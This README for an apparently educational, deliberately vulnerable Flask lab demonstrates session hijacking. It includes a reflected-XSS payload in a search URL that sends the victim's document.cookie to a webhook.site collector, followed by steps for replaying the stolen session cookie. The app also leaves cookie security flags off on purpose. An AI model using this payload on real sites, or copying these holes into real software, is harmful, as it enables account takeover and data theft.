# Session Hijacking via XSS Cookie Theft Lab

This lab demonstrates session hijacking by exploiting an XSS vulnerability to steal session cookies.

## Setup

1. Obtain a webhook.site URL by visiting https://webhook.site and copying your unique URL (e.g., https://webhook.site/abc123).

2. Replace `REPLACE_WITH_ID` in the XSS payload below with your webhook.site ID (the part after webhook.site/).

3. Run the application:

```bash
docker-compose up --build
```

The app will be available at http://localhost:5000

## Demonstration Steps

1. **Victim logs in**: Visit http://localhost:5000/login and log in with any username/password (e.g., user/pass).

2. **Victim visits malicious URL**: The victim is tricked into visiting:
   ```
   http://localhost:5000/search?q=<script>new Image().src="https://webhook.site/REPLACE_WITH_ID?cookie="+document.cookie;</script>
   ```
   Replace `REPLACE_WITH_ID` with your actual webhook.site ID.

3. **XSS executes**: The script runs in the victim's browser, sending `document.cookie` to your webhook.site.

4. **Attacker retrieves cookie**: Check your webhook.site dashboard for the received request containing the `cookie` parameter with the sessionid.

5. **Attacker hijacks session**: In a new browser/incognito window, open DevTools (F12), go to Application → Cookies → localhost:5000, add a cookie named `sessionid` with the stolen value, then visit http://localhost:5000/profile to access the victim's session.

## Technical Details

- **Session cookie**: `sessionid` with a random token value. Intentionally lacks HttpOnly, SameSite, and Secure flags to allow theft.
- **XSS vulnerability**: The /search endpoint echoes the `q` parameter without sanitization, allowing arbitrary script injection.
- **Framework**: Built with Flask (Python).
- **Environment**: Runs in Docker for isolation.

## Files

- `app.py`: Flask application code
- `requirements.txt`: Python dependencies
- `Dockerfile`: Docker image build instructions
- `docker-compose.yml`: Docker Compose configuration
- `templates/`: HTML templates for login, profile, and search pages